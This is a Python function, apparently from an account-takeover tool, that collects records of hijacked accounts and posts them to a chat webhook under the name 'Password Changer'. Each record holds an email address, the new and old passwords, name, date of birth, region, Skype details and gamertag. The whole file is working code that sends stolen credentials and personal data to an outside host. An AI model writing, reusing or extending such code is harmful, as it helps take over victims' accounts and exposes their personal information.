import requests

def send_webhook(results: list, webhook_url: str):
    if not results:
        return

    content = "**✅ Password Changed Successfully For These Accounts:**\n"

    for result in results:
        content += (
            f"**Email:** `{result.get('email', 'N/A')}`\n"
            f"**New Pass:** `{result.get('new_password', 'N/A')}`\n"
            f"**Old Pass:** `{result.get('old_password', 'N/A')}`\n"
            f"**Name:** {result.get('name', 'N/A')}\n"
            f"**DOB:** {result.get('dob', 'N/A')}\n"
            f"**Region:** {result.get('region', 'N/A')}\n"
            f"**Skype ID:** `{result.get('skype_id', 'N/A')}`\n"
            f"**Skype Email:** `{result.get('skype_email', 'N/A')}`\n"
            f"**Gamertag:** `{result.get('gamertag', 'N/A')}`\n"
            "----------------------------\n"
        )

    data = {
        "username": "Password Changer",
        "avatar_url": "https://i.imgur.com/AfFp7pu.png",
        "content": content
    }

    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code not in (200, 204):
            print(f"⚠️ Webhook error: {response.status_code} {response.text}")
    except Exception as e:
        print(f"❌ Failed to send webhook:  ")
